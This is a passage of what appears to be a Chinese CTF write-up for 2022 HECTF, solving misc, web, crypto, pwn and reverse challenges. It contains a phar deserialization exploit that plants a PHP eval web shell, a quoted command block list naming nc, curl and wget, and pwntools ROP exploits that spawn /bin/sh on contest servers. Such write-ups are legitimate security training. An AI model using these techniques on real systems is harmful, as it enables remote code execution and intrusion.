class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">51</span>)<br><br><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(e)<br>f.close()<br></code></pre></td></tr></table></figure><p>解压后得到一个docx</p><p>将字体变成黑色得到flag</p><h2 id="2022HECTF调查问卷"><a href="#2022HECTF调查问卷" class="headerlink" title="2022HECTF调查问卷"></a>2022HECTF调查问卷</h2><p>问卷</p><h2 id="没大没小的鼓励"><a href="#没大没小的鼓励" class="headerlink" title="没大没小的鼓励"></a>没大没小的鼓励</h2><p><em>赛后复现</em></p><p>根据hint得知密码是<code>wocenimenma</code></p><p>进行大小写爆破</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/misc2-1.png"></p><p>sstv得到<code>YjhkNTU2ODg0MTBhZjEwMjU0OWRlNzU2ZWIzZGE4NTQ=</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/misc2-2.png"></p><p>base64得到<code>b8d55688410af102549de756eb3da854</code></p><p>md5得到<code>litangdj</code></p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="迷路的小狮"><a href="#迷路的小狮" class="headerlink" title="迷路的小狮"></a>迷路的小狮</h2><p>1：hebnu is a good site.</p><p>传入<code>http://121.4.119.164:32063/hebnu</code></p><p>2: Can you use another way of requesting？</p><p>post传入<code>hebnu</code></p><p>3: 来自官网的你～。～</p><p>添加<code>Referer: https://www.hebtu.edu.cn</code></p><p>4：Can you come to my house to see me?</p><p>添加<code>X-Forwarded-For: 127.0.0.1</code></p><p>5：Internet Explorer is the best browser！</p><p>添加<code>User-Agent: Internet Explorer</code></p><p>最后在返回包的头中得到一串js，在控制台输入得到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/web2-1.png"></p><h2 id="擎天注"><a href="#擎天注" class="headerlink" title="擎天注"></a>擎天注</h2><p>sqlmap一把梭</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/web3-1.png"></p><h2 id="cute-pipi"><a href="#cute-pipi" class="headerlink" title="cute_pipi"></a>cute_pipi</h2><p>对show参数用伪协议读文件</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;FROM_INDEX&#x27;</span>, <span class="hljs-number">1</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><br><span class="hljs-variable">$file</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-variable">$show</span> = <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show&#x27;</span>]) ? <span class="hljs-string">&#x27;home&#x27;</span> : <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$show</span>) || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\.\./&#x27;</span>, <span class="hljs-variable">$show</span>) || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/zip/i&#x27;</span>,<span class="hljs-variable">$show</span>))<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Not this !!!&#x27;</span>);<br><br><span class="hljs-title function_ invoke__">ob_start</span>(<span class="hljs-string">&#x27;ob_gzhandler&#x27;</span>);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">page_tshow</span>(<span class="hljs-params"><span class="hljs-variable">$show</span></span>) </span>&#123;<br><span class="hljs-meta">?&gt;</span>&lt;!DOCTYPE html&gt;<br>&lt;html&gt;<br>&lt;body&gt;<br>&lt;div id=<span class="hljs-string">&quot;header&quot;</span>&gt;<br>&lt;center&gt;&lt;a href=<span class="hljs-string">&quot;?show=home&quot;</span> <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">logo</span>&quot;&gt;&lt;<span class="hljs-title">img</span> <span class="hljs-title">src</span>=&quot;<span class="hljs-title">images</span>/<span class="hljs-title">logo</span>.<span class="hljs-title">jpg</span>&quot; <span class="hljs-title">alt</span>=&quot;&quot;&gt;&lt;/<span class="hljs-title">a</span>&gt;&lt;/<span class="hljs-title">center</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">div</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">div</span> <span class="hljs-title">id</span>=&quot;<span class="hljs-title">body</span>&quot;&gt;</span><br><span class="hljs-class">&lt;?<span class="hljs-title">php</span></span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">function</span> <span class="hljs-title">fatal</span>($<span class="hljs-title">msg</span>) </span>&#123;<br><span class="hljs-meta">?&gt;</span>&lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">article</span>&quot;&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">h2</span>&gt;<span class="hljs-title">Error</span>&lt;/<span class="hljs-title">h2</span>&gt;</span><br><span class="hljs-class">&lt;<span class="hljs-title">p</span>&gt;&lt;?=$<span class="hljs-title">msg</span>;?&gt;&lt;/<span class="hljs-title">p</span>&gt;</span><br><span class="hljs-class">&lt;/<span class="hljs-title">div</span>&gt;&lt;?<span class="hljs-title">php</span></span><br><span class="hljs-class"><span class="hljs-title">exit</span>(1);</span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">page_tshow</span>($<span class="hljs-title">show</span>);</span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-title">if</span>(!(<span class="hljs-title">include</span> $<span class="hljs-title">show</span> . &#x27;.<span class="hljs-title">php</span>&#x27;))</span><br><span class="hljs-class">    <span class="hljs-title">fatal</span>(&#x27;<span class="hljs-title">no</span> <span class="hljs-title">no</span> <span class="hljs-title">no</span>&#x27;);</span><br><span class="hljs-class"><span class="hljs-title">if</span>(<span class="hljs-title">isset</span>($<span class="hljs-title">file</span>))</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>))<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;surely exists&quot;</span>;<br>    <span class="hljs-keyword">else</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>.<span class="hljs-string">&quot;dont exist&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HeCTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hectf</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;hectf) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9]/&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;hectf) &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$this</span>-&gt;hectf))<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|php|python|mv|mkdir|cp/i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;No no no no no!&#x27;</span>);<br>            &#125;<br>        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;cmd);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>构造png</p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HeCTF</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$hectf</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&quot;echo &#x27;&lt;?=eval(\$_GET[1]);?&gt;&#x27;&gt;cmd.php&quot;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;hectf) &amp;&amp; !<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[0-9]/&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;hectf) &amp;&amp; <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$this</span>-&gt;hectf))<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/\\$|\.|\!|\@|\#|\%|\^|\&amp;|\*|\?|\&#123;|\&#125;|\&gt;|\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|php|python|mv|mkdir|cp/i&#x27;</span>, <span class="hljs-variable">$this</span>-&gt;cmd))&#123;<br>                <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;No no no no no!&#x27;</span>);<br>            &#125;<br>        <span class="hljs-keyword">print</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);<br>        <span class="hljs-comment">// exec($this-&gt;cmd);</span><br>    &#125;<br>&#125;<br><span class="hljs-variable">$phar</span> =<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;awsl.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;XXX&lt;?php XXX __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">HeCTF</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br>@<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;./ez.png&quot;</span>);<br><span class="hljs-title function_ invoke__">copy</span>(<span class="hljs-string">&quot;./awsl.phar&quot;</span>,<span class="hljs-string">&quot;./ez.png&quot;</span>);<br><span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;./awsl.phar&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>上传生成的<code>ez.png</code>，触发payload</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/web1-1.png"></p><p>访问生成的<code>cmd.php</code>，成功rce</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/web1-2.png"></p><h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="流动的音符"><a href="#流动的音符" class="headerlink" title="流动的音符"></a>流动的音符</h2><p>在线音符解密得到<code>EA&gt;N?s:WZgTdPYbMSaYg</code></p><p>将字符串的开头与HECTF比较后不难发现，后面字符是按照+3，+4，+5。。。的规律</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/crypto1-1.png"></p><h2 id="matrix"><a href="#matrix" class="headerlink" title="matrix"></a>matrix</h2><p>题目没出好，flag直接是明文的放在文件中</p><h2 id="ezrsa"><a href="#ezrsa" class="headerlink" title="ezrsa"></a>ezrsa</h2><p>先小指数爆破，得到<code>p</code>和<code>q</code>，通过<code>n/q/p</code>得到<code>t</code>。通过模不互素得到<code>flag</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">boom</span>(<span class="hljs-params">c_,n_,e_</span>):<br>    i=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        <span class="hljs-keyword">if</span> (gmpy2.iroot(c_+i*n_,e_)[<span class="hljs-number">1</span>]==<span class="hljs-number">1</span>):<br>            <span class="hljs-keyword">return</span>  gmpy2.iroot(c_+i*n_,e_)[<span class="hljs-number">0</span>]<br>        i=i+<span class="hljs-number">1</span><br><br>p_= <span class="hljs-number">10660749010264526666955869622200514149424664070021154725214604278423033834800955315638637946982741577976025615843487738805576629855459529381681679497064453109727962183277768658053394103348827822686515016677449953958986089293779870089604784750116267441026319440135025236091029928565442799040007751858012409498271852333017388486644053877238274838173771344350870565886676055860728949042361028753924290647753862707042472944714140635484722345522648010064713004854479094986010632316750770118044301903260988074471243247031854872785324506292730778884664223412372663828159205320038546293395502275887356885181013870536857351801</span><br>q_= <span class="hljs-number">24900409366873586425973971191854411152048453357438215578406168704445779543895031579176888535442469919297663892450230816720758414920791049333275007446412352293152157437672026001378469357187698312455020558413101033543700131403373834030395855212901673914686297701313223697181049265286011127188695284002470629178098454764536315245968458622929902214839704674718996340182311301099900271312644919770585429288043854743210617868761990329037081770477261306489047429460937057125193231432195877922731165870197358946683698077175950756482605399815830687563398277515452842563143685190688865084064679712177247354049377034394880941369</span><br>c= <span class="hljs-number">946358882688806235743551077996671406469185038565566907261383734984318844703303437873183869084536703835433988817350857866089668970925835657856975155167500190428922521871327955274363186305180350899397478897928581580727458938934640786146518171503388507311655160765881370401217708135845031083189007308497775864484758699096082815479602777639307812516934937183952478316508418895341680335172973583094238147073379957772209947376051520041093030641369536800448737539973770258342422560893630082723217759837690008955748444973711508371077927468399703456466637348191192859278206925769696645636969358967735037470196395844215361527039288120664704552775460536654859848091685928057224735031528303041212702445718384890182474053295656578327780048497422707815820736647212902522526653039676698263673166412650104420869762547385554961873764933774143297622712766521201037469301912471740996998228799841957283759679784569638149555093498363791420486340</span><br>n= <span class="hljs-number">1677924010415009671349677258549532467848510897335579570922114838282842960143799964694977371357046837674443739542407516581076865550606801686170400793463690366665534118961173768008603133641864003317727610676872685077700753537755254540591236871020140458419596610210236431401477173114522177145982007059709616618279936170223104755776796458682957656555154039384483954754660803554302451221585280396378564648495919069459351016010016636012245082009946238467068412198769348889950331295680906811430325690102055808865038151762131291269197341984605959088829226733422023970618165958725486675321766767430347929319621215891165857544847088373700410007500868721335483070938971597851859953792409442485301373327127595552457801719192824050415833073999094005750868115932130442747899994421453654008731830580286370350900523295205445599466666709544075950517531382971246869745425091317996973135364990272852701046046315136273893166361180330563013617843</span><br>p=boom(p_,n,<span class="hljs-number">2</span>)<br>q=boom(q_,n,<span class="hljs-number">2</span>)<br>t=n//p//q<br><span class="hljs-keyword">if</span> (t*p*q!=n):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;error&quot;</span>);<br>    exit(<span class="hljs-number">0</span>)<br>e =<span class="hljs-number">114</span><br><br><br>phi_n= (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)*(t-<span class="hljs-number">1</span>)<br><br>t=gmpy2.gcd(e,phi_n)<br>e=e//t<br>d=gmpy2.invert(e,phi_n)<br>m=gmpy2.powmod(c,d,n)<br>msg=gmpy2.iroot(m,t)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(msg[<span class="hljs-number">0</span>])[<span class="hljs-number">2</span>:]))<br></code></pre></td></tr></table></figure><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>传入<code>\x00</code>绕过判断</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/pwn2-1.png"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;49.234.8.239&#x27;</span>,<span class="hljs-string">&#x27;30531&#x27;</span>)<br>p.sendline(<span class="hljs-string">&#x27;\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>输入<code>:!/bin/sh</code>，使得vim中可以执行系统命令</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/pwn2-2.png"></p><h2 id="真·签到"><a href="#真·签到" class="headerlink" title="真·签到"></a>真·签到</h2><p>传入一个<code>0xFFFFF82</code>即可</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/pwn1-1.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/pwn1-2.png"></p><h2 id="static"><a href="#static" class="headerlink" title="static"></a>static</h2><p>栈溢出构造<code>rep</code>链，执行<code>execve(&quot;/bin/sh&quot;)</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/pwn3-1.png"></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/pwn3-2.png"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>rdi=<span class="hljs-number">0x00000000004018b2</span><br>rsi=<span class="hljs-number">0x000000000040661e</span><br>rdx=<span class="hljs-number">0x00000000004017bf</span><br>ret=<span class="hljs-number">0x000000000040f408</span><br>syscall=<span class="hljs-number">0x00000000004012e3</span><br>rax=<span class="hljs-number">0x0000000000451aa7</span><br>read=<span class="hljs-number">0x450ff0</span><br><br><span class="hljs-comment">#p=remote()</span><br><span class="hljs-comment">#p=process(&#x27;./static&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p,&#x27;bp 0x401e3c&#x27;)</span><br><span class="hljs-comment">#pause()</span><br>p=remote(<span class="hljs-string">&#x27;121.4.119.164&#x27;</span>,<span class="hljs-string">&#x27;32430&#x27;</span>)<br>e=ELF(<span class="hljs-string">&#x27;./static&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x29</span>)<br>payload=flat(<br>        rdi,<span class="hljs-number">0</span>,<br>        rsi,e.bss(<span class="hljs-number">0x100</span>),<br>        rdx,<span class="hljs-number">0x20</span>,<br>        read,<br>        rdi,e.bss(<span class="hljs-number">0x100</span>),<br>        rsi,<span class="hljs-number">0</span>,<br>        rdx,<span class="hljs-number">0</span>,<br>        ret,<br>        rax,<span class="hljs-number">0x3b</span>,<br>        syscall);<br>p.send(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+<span class="hljs-string">b&#x27;c&#x27;</span>*<span class="hljs-number">8</span>+payload)<br><br>p.interactive()<br><span class="hljs-comment">#for i in range(8):</span><br><span class="hljs-comment">#    p.sendline(&#x27;+&#x27;)</span><br><span class="hljs-comment">#for i in range(8):</span><br><span class="hljs-comment">#    p.sendline(&#x27;+&#x27;)</span><br><br>p.sendline(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/pwn3-3.png"></p><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="apk"><a href="#apk" class="headerlink" title="apk"></a>apk</h2><p><em>赛后复现</em></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse5-1.png"></p><h2 id="贝斯"><a href="#贝斯" class="headerlink" title="贝斯"></a>贝斯</h2><p>输入的数据经过某种加密后对每个字节取反，然后与<code>P0w3r</code>的内容比较<br>在<code>Enc0de</code>中看字符集发现是base32加密</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse1-1.png"></p><p>将<code>P0w3r</code>变量的内容提取出来后异或<code>0xff</code>，base32解码即可</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><br>a=[<span class="hljs-number">0xB5</span>,<span class="hljs-number">0xBD</span>,<span class="hljs-number">0xBC</span>,<span class="hljs-number">0xAA</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xA9</span>,<span class="hljs-number">0xBC</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xAF</span>,<span class="hljs-number">0xB1</span>,<span class="hljs-number">0xBA</span>,<span class="hljs-number">0xAA</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xCA</span>,<span class="hljs-number">0xB3</span>,<span class="hljs-number">0xAC</span>,<span class="hljs-number">0xB0</span>,<span class="hljs-number">0xB2</span>,<span class="hljs-number">0xA5</span>,<span class="hljs-number">0xAA</span>,<span class="hljs-number">0xCD</span>,<span class="hljs-number">0xC9</span>,<span class="hljs-number">0xB4</span>,<span class="hljs-number">0xAB</span>,<span class="hljs-number">0xB0</span>,<span class="hljs-number">0xAD</span>,<span class="hljs-number">0xAE</span>,<span class="hljs-number">0xA7</span>,<span class="hljs-number">0xBA</span>,<span class="hljs-number">0xCB</span>,<span class="hljs-number">0xA5</span>,<span class="hljs-number">0xAD</span>,<span class="hljs-number">0xB1</span>,<span class="hljs-number">0xA5</span>,<span class="hljs-number">0xBD</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xAC</span>,<span class="hljs-number">0xCA</span>,<span class="hljs-number">0xBB</span>,<span class="hljs-number">0xAA</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xB1</span>,<span class="hljs-number">0xA5</span>,<span class="hljs-number">0xBA</span>,<span class="hljs-number">0xB0</span>,<span class="hljs-number">0xCB</span>,<span class="hljs-number">0xAB</span>,<span class="hljs-number">0xB5</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xB1</span>,<span class="hljs-number">0xAB</span>,<span class="hljs-number">0xBC</span>,<span class="hljs-number">0xB2</span>,<span class="hljs-number">0xA9</span>,<span class="hljs-number">0xA5</span>,<span class="hljs-number">0xAE</span>,<span class="hljs-number">0xB8</span>,<span class="hljs-number">0xB1</span>,<span class="hljs-number">0xC9</span>,<span class="hljs-number">0xAE</span>]<br>e=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    e+=<span class="hljs-built_in">chr</span>(i^<span class="hljs-number">0xff</span>)<br>e+=<span class="hljs-string">&#x27;====&#x27;</span><br><span class="hljs-built_in">print</span>(base64.b32decode(e))<br></code></pre></td></tr></table></figure><h2 id="HelloIos"><a href="#HelloIos" class="headerlink" title="HelloIos"></a>HelloIos</h2><p>一个简单的比较，异或<code>0x1F</code>然后加1</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse2-1.png"></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">&#x27;X[]LZeX&#123;ttqAwqmc&#x27;</span><br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    e+=<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">0x1f</span>)+<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><h2 id="author’sB0x"><a href="#author’sB0x" class="headerlink" title="author’sB0x"></a>author’sB0x</h2><p>观察发现<code>init_S</code>,<code>init_Key</code>,<code>permute_S</code>,<code>create_key_stream</code>这几个函数中用到的数据是固定的，用来生成<code>KeyStream</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/2022hectf/reverse3-1.png"></p><p>直接粘贴到编译器运行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 